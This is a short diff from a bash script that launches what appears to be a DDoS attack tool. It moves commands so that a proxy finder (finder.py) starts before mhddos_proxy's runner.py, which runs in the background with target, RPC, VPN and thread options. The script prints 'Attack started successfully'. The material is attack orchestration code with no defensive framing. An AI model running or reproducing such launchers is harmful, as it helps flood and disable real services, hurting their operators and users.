@@ -161,10 +161,11 @@ do
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
             echo "python runner.py $cmd_line --rpc $rpc $vpn -t $threads $debug"
             
-            cd ~/mhddos_proxy
-            python runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug&
 	    cd ~/proxy_finder
 	    python finder.py&
+            cd ~/mhddos_proxy
+            python runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug&
+	    
 	    
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    	done
